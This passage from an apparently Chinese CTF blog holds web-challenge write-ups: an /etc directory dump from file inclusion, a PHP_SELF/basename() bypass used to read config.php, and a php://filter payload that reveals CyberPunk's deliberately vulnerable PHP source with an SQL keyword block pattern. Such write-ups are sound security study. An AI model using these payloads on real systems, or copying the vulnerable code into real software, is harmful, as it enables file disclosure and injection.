&quot;ca-certificates&quot;</span><br><span class="line">  [14]&#x3D;&gt;</span><br><span class="line">  string(20) &quot;ca-certificates.conf&quot;</span><br><span class="line">  [15]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;cron.d&quot;</span><br><span class="line">  [16]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;cron.daily&quot;</span><br><span class="line">  [17]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;cron.weekly&quot;</span><br><span class="line">  [18]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;dbus-1&quot;</span><br><span class="line">  [19]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;debconf.conf&quot;</span><br><span class="line">  [20]&#x3D;&gt;</span><br><span class="line">  string(14) &quot;debian_version&quot;</span><br><span class="line">  [21]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;default&quot;</span><br><span class="line">  [22]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;deluser.conf&quot;</span><br><span class="line">  [23]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;dhcp&quot;</span><br><span class="line">  [24]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;dpkg&quot;</span><br><span class="line">  [25]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;environment&quot;</span><br><span class="line">  [26]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;fstab&quot;</span><br><span class="line">  [27]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;gai.conf&quot;</span><br><span class="line">  [28]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;gcbcgffhac&quot;</span><br><span class="line">  [29]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;group&quot;</span><br><span class="line">  [30]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;group-&quot;</span><br><span class="line">  [31]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;gshadow&quot;</span><br><span class="line">  [32]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;gshadow-&quot;</span><br><span class="line">  [33]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;host.conf&quot;</span><br><span class="line">  [34]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;hostname&quot;</span><br><span class="line">  [35]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;hosts&quot;</span><br><span class="line">  [36]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;init&quot;</span><br><span class="line">  [37]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;init.d&quot;</span><br><span class="line">  [38]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;inputrc&quot;</span><br><span class="line">  [39]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;insserv&quot;</span><br><span class="line">  [40]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;insserv.conf&quot;</span><br><span class="line">  [41]&#x3D;&gt;</span><br><span class="line">  string(14) &quot;insserv.conf.d&quot;</span><br><span class="line">  [42]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;issue&quot;</span><br><span class="line">  [43]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;issue.net&quot;</span><br><span class="line">  [44]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;kernel&quot;</span><br><span class="line">  [45]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;ld.so.cache&quot;</span><br><span class="line">  [46]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;ld.so.conf&quot;</span><br><span class="line">  [47]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;ld.so.conf.d&quot;</span><br><span class="line">  [48]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;ldap&quot;</span><br><span class="line">  [49]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;legal&quot;</span><br><span class="line">  [50]&#x3D;&gt;</span><br><span class="line">  string(13) &quot;libaudit.conf&quot;</span><br><span class="line">  [51]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;locale.alias&quot;</span><br><span class="line">  [52]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;locale.gen&quot;</span><br><span class="line">  [53]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;localtime&quot;</span><br><span class="line">  [54]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;logcheck&quot;</span><br><span class="line">  [55]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;login.defs&quot;</span><br><span class="line">  [56]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;logrotate.d&quot;</span><br><span class="line">  [57]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;lsb-release&quot;</span><br><span class="line">  [58]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;machine-id&quot;</span><br><span class="line">  [59]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;magic&quot;</span><br><span class="line">  [60]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;magic.mime&quot;</span><br><span class="line">  [61]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;mailcap&quot;</span><br><span class="line">  [62]&#x3D;&gt;</span><br><span class="line">  string(13) &quot;mailcap.order&quot;</span><br><span class="line">  [63]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;mime.types&quot;</span><br><span class="line">  [64]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;mke2fs.conf&quot;</span><br><span class="line">  [65]&#x3D;&gt;</span><br><span class="line">  string(14) &quot;modules-load.d&quot;</span><br><span class="line">  [66]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;mtab&quot;</span><br><span class="line">  [67]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;mysql&quot;</span><br><span class="line">  [68]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;networks&quot;</span><br><span class="line">  [69]&#x3D;&gt;</span><br><span class="line">  string(13) &quot;nsswitch.conf&quot;</span><br><span class="line">  [70]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;opt&quot;</span><br><span class="line">  [71]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;os-release&quot;</span><br><span class="line">  [72]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;pam.conf&quot;</span><br><span class="line">  [73]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;pam.d&quot;</span><br><span class="line">  [74]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;passwd&quot;</span><br><span class="line">  [75]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;passwd-&quot;</span><br><span class="line">  [76]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;perl&quot;</span><br><span class="line">  [77]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;php&quot;</span><br><span class="line">  [78]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;profile&quot;</span><br><span class="line">  [79]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;profile.d&quot;</span><br><span class="line">  [80]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;python3.8&quot;</span><br><span class="line">  [81]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;rc.local&quot;</span><br><span class="line">  [82]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;rc0.d&quot;</span><br><span class="line">  [83]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;rc1.d&quot;</span><br><span class="line">  [84]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;rc2.d&quot;</span><br><span class="line">  [85]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;rc3.d&quot;</span><br><span class="line">  [86]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;rc4.d&quot;</span><br><span class="line">  [87]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;rc5.d&quot;</span><br><span class="line">  [88]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;rc6.d&quot;</span><br><span class="line">  [89]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;rcS.d&quot;</span><br><span class="line">  [90]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;resolv.conf&quot;</span><br><span class="line">  [91]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;rmt&quot;</span><br><span class="line">  [92]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;securetty&quot;</span><br><span class="line">  [93]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;security&quot;</span><br><span class="line">  [94]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;selinux&quot;</span><br><span class="line">  [95]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;shadow&quot;</span><br><span class="line">  [96]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;shadow-&quot;</span><br><span class="line">  [97]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;shells&quot;</span><br><span class="line">  [98]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;skel&quot;</span><br><span class="line">  [99]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;ssl&quot;</span><br><span class="line">  [100]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;subgid&quot;</span><br><span class="line">  [101]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;subgid-&quot;</span><br><span class="line">  [102]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;subuid&quot;</span><br><span class="line">  [103]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;subuid-&quot;</span><br><span class="line">  [104]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;sysctl.conf&quot;</span><br><span class="line">  [105]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;sysctl.d&quot;</span><br><span class="line">  [106]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;systemd&quot;</span><br><span class="line">  [107]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;terminfo&quot;</span><br><span class="line">  [108]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;timezone&quot;</span><br><span class="line">  [109]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;tmpfiles.d&quot;</span><br><span class="line">  [110]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;ucf.conf&quot;</span><br><span class="line">  [111]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;udev&quot;</span><br><span class="line">  [112]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;ufw&quot;</span><br><span class="line">  [113]&#x3D;&gt;</span><br><span class="line">  string(13) &quot;update-motd.d&quot;</span><br><span class="line">  [114]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;vim&quot;</span><br><span class="line">  [115]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;wgetrc&quot;</span><br><span class="line">  [116]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;xdg&quot;</span><br><span class="line">&#125;</span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"> [0]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;..&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;egdcbahfbh&quot;</span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line">dedhfgiaai</span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"> [0]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;..&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;aeebhaaejd&quot;</span><br><span class="line">&#125;</span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>获得如上目录，并在最后的一个目录下发现了fl44444g，然后直接文件包含即可<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210516005105.png" alt="img" style="zoom:67%;"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/22/buuctf16/">buuctf16</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-22</time><div class="content"><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>查看源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, $_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  $guess = (<span class="keyword">string</span>) $_POST[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $message = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分为两个部分，先说下面吧，让我们比对一个secret，看了一下，根本不可能爆破跑出来的</p>
<p>所以重点应该在上部分，说flag在config.php当中，并且还用了一个正则匹配waf掉config.php，有那种防止我们直接读取的味道，然后下面getsource中，对于我们传入的php_self也是可以直接显示的，所以猜想关键点是绕过这里<br><strong>几个点学习一下吧:</strong><br>1.$_SERVER[‘PHP_SELF’]是什么？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_SERVER[&#39;PHP_SELF&#39;] 表示当前 php 文件相对于网站根目录的位置地址，与 document root 相关。</span><br><span class="line">假设我们有如下网址，$_SERVER[‘PHP_SELF’]得到的结果分别为：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;www.baicai.link&#x2F;index&#x2F; ：&#x2F;index&#x2F;index.php</span><br><span class="line">http:&#x2F;&#x2F;www.baicai.link&#x2F;cate&#x2F;miandan.html ：&#x2F;cate&#x2F;miandan.html</span><br><span class="line">http:&#x2F;&#x2F;www.baicai.link&#x2F;php&#x2F;index.php?test&#x3D;foo ：&#x2F;php&#x2F;index.php</span><br><span class="line">http:&#x2F;&#x2F;www.baicai.link&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo ：&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo</span><br></pre></td></tr></table></figure>

<p>所以很明显php_self是我们可控的，接下来看看能否尝试绕过正则匹配<br>就需要看看basename()有没有什么特性，比如php字符串的规则啥的~<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210523212837.png" alt="img" style="zoom:67%;"></p>
<p>在php手册中，我们发现如果路径包含对当前区域设置无效的字符，则basename()的行为未定义。</p>
<p>所以<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210523213048.png" alt="img" style="zoom:67%;"><br>接下来我们来构造一下payload:<br>我们知道phpself获取的是最后一个/后的内容，我们直接输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;config.php?source</span><br></pre></td></tr></table></figure>

<p>是不行的——这样变成我们执行的是config.php的内容<br>所以应该是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;config.php</span><br></pre></td></tr></table></figure>

<p>此时执行的index.php，获取的是config.php<br>接下来是绕过正则匹配</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;config.php&#x2F;我认为?source&#x3D;</span><br></pre></td></tr></table></figure>

<h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p>查看源码，发现file，可以打开文件，于是想到文件包含，试试伪协议读取文件，发现可以<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.baase64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//index.php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line">$file = (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]) ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,$file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//search.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">if</span>(!$row) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;&lt;p&gt;å§å:&quot;</span>.$row[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, çµè¯:&quot;</span>.$row[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, å°å:&quot;</span>.$row[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;æªæ¾å°è®¢å!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;ä¿¡æ¯ä¸å¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//change.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.$address.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.$row[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.$row[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;è®¢åä¿®æ¹æå&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;æªæ¾å°è®¢å!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;ä¿¡æ¯ä¸å¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//confirm.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = $_POST[<span class="string">&quot;address&quot;</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $msg = $user_name.<span class="string">&quot;å·²æäº¤è®¢å&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br><span class="line">        $re = $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(<span class="string">&quot;sss&quot;</span>, $user_name, $address, $phone);</span><br><span class="line">        $re = $re-&gt;execute();</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;è®¢åæäº¤æå&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;ä¿¡æ¯ä¸å¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//delete.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $result = $db-&gt;query(<span class="string">&#x27;delete from `user` where `user_id`=&#x27;</span> . $row[<span class="string">&quot;user_id&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;è®¢åå é¤æå&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;æªæ¾å°è®¢å!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;ä¿¡æ¯ä¸å¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span 